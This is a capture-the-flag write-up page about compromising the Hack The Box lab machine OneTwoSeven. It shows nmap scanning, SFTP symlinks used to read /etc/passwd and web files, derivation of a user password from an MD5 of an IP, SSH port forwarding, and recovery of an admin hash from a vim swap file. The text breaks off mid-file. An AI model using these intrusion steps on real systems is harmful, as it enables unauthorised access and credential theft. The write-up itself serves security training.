<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - OneTwoSeven - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-OneTwoSeven"><a href="#Hack-The-Box-OneTwoSeven" class="headerlink" title="Hack The Box - OneTwoSeven"></a>Hack The Box - OneTwoSeven</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today OneTwoSeven retired and here’s my write-up about it. It was a very special box and I enjoyed every part of it, especially the <code>apt</code> man in the middle attack part. Definitely one of my favorite boxes. It’s a Linux box and its ip is <code>10.10.10.133</code>, I added it to <code>/etc/hosts</code> as <code>onetwoseven.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/onetwoseven/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :<br><code>nmap -sV -sT -sC onetwoseven.htb</code><br><img src="/images/hackthebox/onetwoseven/1.png" alt=""><br>Only <code>http</code> on port 80 and <code>ssh</code>.</p>
<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>By going to <code>http://onetwoseven.htb</code> we see this nice website :<br><img src="/images/hackthebox/onetwoseven/2.png" alt=""><br>There’s a sign-up button, and some other info :<br><img src="/images/hackthebox/onetwoseven/3.png" alt=""><br><img src="/images/hackthebox/onetwoseven/4.png" alt=""><br><img src="/images/hackthebox/onetwoseven/5.png" alt=""><br><img src="/images/hackthebox/onetwoseven/6.png" alt=""><br>So now we know that <code>sftp</code> is running, and we also know that if we tried to bruteforce anything we’ll get banned.<br>If we look at the navigation bar we can see 3 pages :<br><img src="/images/hackthebox/onetwoseven/7.png" alt=""><br>Home is where we are, statistics just shows stuff like up-time, banned ip addresses etc.., there’s a page titled Admin and it’s disabled, let’s look at the <code>html</code> source :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">&lt;!-- Only enable link if access from trusted networks admin/20190212 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Added localhost admin/20190214 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"adminlink"</span> <span class="attr">class</span>=<span class="string">"nav-link disabled"</span> <span class="attr">href</span>=<span class="string">"http://onetwoseven.htb:60080/"</span>&gt;</span>Admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Admin’s page is on port 60080 and it’s only accessible from <code>localhost</code>, so we can skip that for now.<br>I clicked on the sign-up button and got this page :<br><img src="/images/hackthebox/onetwoseven/8.png" alt=""><br>We have credentials for <code>sftp</code> : <code>ots-5MWI1ZmI : f991b5fb</code><br>and we also have a personal home page (<a href="http://onetwoseven.htb/~ots-5MWI1ZmI/" target="_blank" rel="noopener">http://onetwoseven.htb/~ots-5MWI1ZmI/</a>) which looks like this :<br><img src="/images/hackthebox/onetwoseven/9.png" alt=""></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Nothing here.<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-tag">body</span> &#123; <span class="attribute">margin</span>:<span class="number">0</span>; <span class="attribute">padding</span>:<span class="number">0</span>; <span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"/dist/img/abstract-architecture-attractive-988873.jpg"</span>) no-repeat center center fixed; <span class="attribute">-webkit-background-size</span>: cover; <span class="attribute">-moz-background-size</span>: cover; <span class="attribute">-o-background-size</span>: cover; <span class="attribute">background-size</span>: cover; &#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="SFTP-User-Flag"><a href="#SFTP-User-Flag" class="headerlink" title="SFTP, User Flag"></a>SFTP, User Flag</h2><p>With the <code>sftp</code> credentials we have we can access the root directory of our home page :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven# sftp ots-5MWI1ZmI@onetwoseven.htb</span><br><span class="line">ots-5MWI1ZmI@onetwoseven.htb&#39;s password:</span><br><span class="line">Connected to ots-5MWI1ZmI@onetwoseven.htb.</span><br><span class="line">sftp&gt; ls</span><br><span class="line">public_html</span><br><span class="line">sftp&gt; ls -la</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Aug 29 19:57 .</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..</span><br><span class="line">drwxr-xr-x    2 1010     1010         4096 Feb 15  2019 public_html</span><br><span class="line">sftp&gt; pwd</span><br><span class="line">Remote working directory: &#x2F;</span><br><span class="line">sftp&gt; cd public_html</span><br><span class="line">sftp&gt; ls -la</span><br><span class="line">drwxr-xr-x    2 1010     1010         4096 Feb 15  2019 .</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..</span><br><span class="line">-rw-r--r--    1 1010     1010          349 Feb 15  2019 index.html</span><br><span class="line">sftp&gt;</span><br></pre></td></tr></table></figure>
<p>You may wonder why we didn’t see an open port for <code>sftp</code>, that’s because <code>sftp</code> runs on top of <code>ssh</code> by default, check <a href="https://www.jscape.com/blog/what-port-does-sftp-use" target="_blank" rel="noopener">this</a>.<br>I created a <code>php</code> test file and uploaded it :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'test'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sftp&gt; put test.php</span><br><span class="line">Uploading test.php to &#x2F;public_html&#x2F;test.php</span><br><span class="line">test.php                                                                                                                                                                         100%   22     0.1KB&#x2F;s   00:00    </span><br><span class="line">sftp&gt;</span><br></pre></td></tr></table></figure>
<p>Unfortunately it will respond with <code>403</code> to any uploaded <code>php</code> file :<br><img src="/images/hackthebox/onetwoseven/10.png" alt=""><br>I checked the commands list of <code>sftp</code> and saw that I can create symlinks with <code>symlink</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">sftp&gt; help</span><br><span class="line">Available commands:</span><br><span class="line">bye                                Quit sftp</span><br><span class="line">cd path                            Change remote directory to &#39;path&#39;</span><br><span class="line">chgrp grp path                     Change group of file &#39;path&#39; to &#39;grp&#39;</span><br><span class="line">chmod mode path                    Change permissions of file &#39;path&#39; to &#39;mode&#39;</span><br><span class="line">chown own path                     Change owner of file &#39;path&#39; to &#39;own&#39;</span><br><span class="line">df [-hi] [path]                    Display statistics for current directory or</span><br><span class="line">                                   filesystem containing &#39;path&#39;</span><br><span class="line">exit                               Quit sftp</span><br><span class="line">get [-afPpRr] remote [local]       Download file</span><br><span class="line">reget [-fPpRr] remote [local]      Resume download file</span><br><span class="line">reput [-fPpRr] [local] remote      Resume upload file</span><br><span class="line">help                               Display this help text</span><br><span class="line">lcd path                           Change local directory to &#39;path&#39;</span><br><span class="line">lls [ls-options [path]]            Display local directory listing</span><br><span class="line">lmkdir path                        Create local directory</span><br><span class="line">ln [-s] oldpath newpath            Link remote file (-s for symlink)</span><br><span class="line">lpwd                               Print local working directory</span><br><span class="line">ls [-1afhlnrSt] [path]             Display remote directory listing</span><br><span class="line">lumask umask                       Set local umask to &#39;umask&#39;</span><br><span class="line">mkdir path                         Create remote directory</span><br><span class="line">progress                           Toggle display of progress meter</span><br><span class="line">put [-afPpRr] local [remote]       Upload file</span><br><span class="line">pwd                                Display remote working directory</span><br><span class="line">quit                               Quit sftp</span><br><span class="line">rename oldpath newpath             Rename remote file</span><br><span class="line">rm path                            Delete remote file</span><br><span class="line">rmdir path                         Remove remote directory</span><br><span class="line">symlink oldpath newpath            Symlink remote file</span><br><span class="line">version                            Show SFTP version</span><br><span class="line">!command                           Execute &#39;command&#39; in local shell</span><br><span class="line">!                                  Escape to local shell</span><br><span class="line">?                                  Synonym for help</span><br><span class="line">sftp&gt;</span><br></pre></td></tr></table></figure>
<p>So I tried to create a symlink to <code>/etc/passwd</code> and it worked :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sftp&gt; symlink &#x2F;etc&#x2F;passwd passwd</span><br><span class="line">sftp&gt; ls -la</span><br><span class="line">drwxr-xr-x    2 1010     1010         4096 Aug 29 20:14 .</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..</span><br><span class="line">-rw-r--r--    1 1010     1010          349 Feb 15  2019 index.html</span><br><span class="line">lrwxrwxrwx    1 1010     1010           11 Aug 29 20:14 passwd</span><br><span class="line">sftp&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/onetwoseven/11.png" alt=""><br>As you can see there’s a user with <code>localhost</code>‘s ip, that can be helpful but we need to know his password, we already got the username : <code>ots-yODc2NGQ</code>.<br>I wanted to know how usernames were generated so I made some assumptions and tested them.<br>Usernames were following the same pattern which was <code>ots-</code> then a base-64 encoded string , I tried to decode the string from my username (<code>5MWI1ZmI</code>) but I got nothing readable, so I tried to encode my password (<code>f991b5fb</code>) :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven# echo f991b5fb | base64</span><br><span class="line">Zjk5MWI1ZmIK</span><br></pre></td></tr></table></figure>
<p>So the string in usernames is part of the base-64 encoded password, but how these password are generated in the first place ? my password looked like <code>hex</code> but after decoding it I got nothing readable so I guessed it might be a part of an <code>md5</code> hash, but what hash ? I tried the <code>md5</code> hash of my ip :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/onetwoseven<span class="comment"># python</span></span><br><span class="line">Python <span class="number">2.7</span><span class="number">.16</span> (default, Apr  <span class="number">6</span> <span class="number">2019</span>, <span class="number">01</span>:<span class="number">42</span>:<span class="number">57</span>)</span><br><span class="line">[GCC <span class="number">8.3</span><span class="number">.0</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> md5(<span class="string">"10.10.xx.xx"</span>).hexdigest()</span><br><span class="line">f991b5fbxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>So passwords are just the first 8 chars of the ip’s md5 hash, now we can generate the password for <code>ots-yODc2NGQ</code> based on the same idea :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> md5(<span class="string">"127.0.0.1"</span>).hexdigest()</span><br><span class="line">f528764d624db129b32c21fbca0cb8d6</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p><code>ots-yODc2NGQ : f528764d</code>  , let’s try it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven# sftp ots-yODc2NGQ@onetwoseven.htb</span><br><span class="line">ots-yODc2NGQ@onetwoseven.htb&#39;s password:</span><br><span class="line">Connected to ots-yODc2NGQ@onetwoseven.htb.</span><br><span class="line">sftp&gt; ls -la</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Feb 15  2019 .</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Feb 15  2019 ..</span><br><span class="line">drwxr-xr-x    2 999      999          4096 Feb 15  2019 public_html</span><br><span class="line">-r--r-----    1 0        999            33 Feb 15  2019 user.txt</span><br><span class="line">sftp&gt; get user.txt</span><br><span class="line">Fetching &#x2F;user.txt to user.txt</span><br><span class="line">&#x2F;user.txt                                                                                                                                                                        100%   33     0.2KB&#x2F;s   00:00    </span><br><span class="line">sftp&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/onetwoseven/12.png" alt=""><br>We owned user.</p>
<h2 id="Admin-panel-Arbitrary-File-Upload-RCE"><a href="#Admin-panel-Arbitrary-File-Upload-RCE" class="headerlink" title="Admin panel, Arbitrary File Upload, RCE"></a>Admin panel, Arbitrary File Upload, RCE</h2><p>I tried <code>ssh</code> but I got this message :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven# ssh ots-yODc2NGQ@onetwoseven.htb</span><br><span class="line">ots-yODc2NGQ@onetwoseven.htb&#39;s password:</span><br><span class="line">This service allows sftp connections only.</span><br><span class="line">Connection to onetwoseven.htb closed.</span><br></pre></td></tr></table></figure>
<p>However we can still use it to forward ports, let’s forward port <code>60080</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven# ssh -nNT -L 60080:127.0.0.1:60080 ots-yODc2NGQ@onetwoseven.htb</span><br><span class="line">ots-yODc2NGQ@onetwoseven.htb&#39;s password:</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/onetwoseven/13.png" alt=""><br>We need credentials to login, I used the <code>symlink</code> command and created a symlink to <code>/var/www</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sftp&gt; symlink &#x2F;var&#x2F;www www</span><br><span class="line">sftp&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/onetwoseven/14.png" alt=""><br><img src="/images/hackthebox/onetwoseven/15.png" alt=""><br>I downloaded <code>login.php.swp</code> :<br><img src="/images/hackthebox/onetwoseven/16.png" alt=""><br>Because it’s a <code>vim</code> swap file it had a lot of unreadable characters so I used strings :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven# strings login.php.swp &gt; login.php</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven#</span><br></pre></td></tr></table></figure>
<p><code>login.php</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">b0VIM <span class="number">8.0</span></span><br><span class="line">u\k*</span><br><span class="line">root</span><br><span class="line">onetwoseven</span><br><span class="line">/<span class="keyword">var</span>/www/html-admin/login.php</span><br><span class="line">utf<span class="number">-8</span></span><br><span class="line"><span class="number">3210</span></span><br><span class="line"><span class="comment">#"! </span></span><br><span class="line">	    &lt;table&gt;</span><br><span class="line">            &lt;h4 class = "form-signin-heading"&gt;&lt;font size="-1" color="red"&gt;&lt;?php echo $msg; ?&gt;&lt;/font&gt;&lt;/h4&gt;</span><br><span class="line">         &lt;form action=<span class="string">"/login.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">      </span><br><span class="line">      &lt;div class = "container"&gt;</span><br><span class="line">      </span><br><span class="line">      &lt;/div&gt; &lt;!-- /container --&gt;</span><br><span class="line">         <span class="meta">?&gt;</span></span><br><span class="line">            &#125;</span><br><span class="line">              &#125;</span><br><span class="line">    				      </span><br><span class="line">		   </span><br><span class="line">	      <span class="keyword">if</span> ($_POST[<span class="string">'username'</span>] == <span class="string">'ots-admin'</span> &amp;&amp; hash(<span class="string">'sha256'</span>,$_POST[<span class="string">'password'</span>]) == <span class="string">'11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">            </span><br><span class="line">            $msg = 